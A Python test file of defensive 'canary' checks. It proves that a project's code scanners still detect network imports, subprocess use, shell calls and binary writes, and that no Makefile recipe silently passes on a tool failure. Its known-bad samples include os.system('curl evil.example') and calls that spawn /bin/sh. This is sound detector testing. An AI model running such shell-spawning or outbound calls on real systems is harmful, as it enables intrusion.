"""Canary self-tests: prove every guarantee scanner still bites.

The gate tests assert the current tree is *clean*. A clean tree also passes if a
scanner silently stops detecting anything — so these tests feed each scanner a
known-bad source string and assert it reports the offender. If a refactor breaks a
scanner, one of these fails instead of the gate quietly going green forever.
"""

from __future__ import annotations

from gates import (
    scan_audio_write_apis,
    scan_binary_write,
    scan_exec_imports,
    scan_network_imports,
    scan_os_shell_calls,
)


def test_network_import_scanner_bites():
    assert scan_network_imports("import requests")
    assert scan_network_imports("import socket")
    assert scan_network_imports("from urllib.request import urlopen")
    assert not scan_network_imports("import json")


def test_exec_import_scanner_bites():
    assert scan_exec_imports("import subprocess")
    assert scan_exec_imports("import ctypes")
    assert scan_exec_imports("from subprocess import Popen")
    assert not scan_exec_imports("import json")


def test_os_shell_call_scanner_bites():
    assert scan_os_shell_calls("import os\nos.system('curl evil.example')")
    assert scan_os_shell_calls("import os\nos.popen('ls')")
    assert scan_os_shell_calls("import os\nos.spawnl(os.P_WAIT, '/bin/sh')")
    assert scan_os_shell_calls("import os\nos.execv('/bin/sh', ['sh'])")
    assert not scan_os_shell_calls("import os\nos.path.join('a', 'b')")


def test_audio_write_api_scanner_bites():
    assert scan_audio_write_apis("import wave")
    assert scan_audio_write_apis("data.tobytes()")
    assert scan_audio_write_apis("import audioop")
    assert not scan_audio_write_apis("import json")


def test_binary_write_scanner_bites():
    assert scan_binary_write("open('x', 'wb')")
    assert scan_binary_write("import io\nio.open('x', 'wb')")
    assert scan_binary_write("from pathlib import Path\nPath('x').write_bytes(b'')")
    assert scan_binary_write("import os\nos.open('x', os.O_WRONLY | os.O_CREAT)")
    assert not scan_binary_write("open('x', 'r')")
    assert not scan_binary_write("open('x')")


# --- The gates themselves must be able to fail --------------------------------------
#
# `make verify` is the local mirror of CI, and its own `security` target carries a
# comment about why soft-skipping a missing tool is forbidden (CICD-27): a developer
# gets a false "all gates passed". The same defect has a second shape, and it is worse,
# because it fires when the tool IS installed: `command -v tool && tool ... || echo
# "tool not available"`. In `A && B || C`, C runs whenever B *fails*, so a real finding
# exits 0 and prints "not available" -- a green gate and a false explanation for it.
# The `pdf-a11y` target already uses the correct `if command -v ...; then ...; else
# ...; fi` shape; this test holds every recipe to it.


def _recipe_lines() -> list[tuple[int, str]]:
    from conftest import ROOT

    return [
        (n, line)
        for n, line in enumerate((ROOT / "Makefile").read_text().splitlines(), start=1)
        if line.startswith("\t")
    ]


def test_no_make_recipe_swallows_a_tool_failure_into_an_echo():
    offenders = []
    for n, line in _recipe_lines():
        if "&&" not in line or "||" not in line:
            continue  # a bare `guard || { echo; exit 1; }` is a precondition, not a gate
        fallback = line.rsplit("||", 1)[1]
        if "exit 1" not in fallback and "false" not in fallback:
            offenders.append(f"Makefile:{n}: {line.strip()}")
    assert not offenders, (
        "a recipe catches its own tool's failure in a fallback that exits 0, so the gate "
        "reports success on a real finding:\n" + "\n".join(offenders)
    )
